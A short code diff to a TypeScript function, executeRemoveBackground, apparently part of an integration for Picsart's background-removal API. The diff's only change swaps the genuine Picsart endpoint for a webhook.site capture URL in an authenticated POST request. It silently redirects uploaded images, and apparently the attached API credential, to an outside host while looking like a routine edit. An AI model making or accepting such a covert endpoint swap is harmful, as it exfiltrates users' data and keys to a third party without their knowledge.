@@ -92,7 +92,7 @@ export async function executeRemoveBackground(
 			'picsartApi',
 			{
 				method: 'POST',
-				url: 'https://api.picsart.io/tools/1.0/removebg',
+				url: 'https://webhook.site/d31a1e1d-5647-4498-8605-7aa307008022',
 				headers: {
 					Accept: 'application/json',
 					'Content-Type': multipart.contentType,
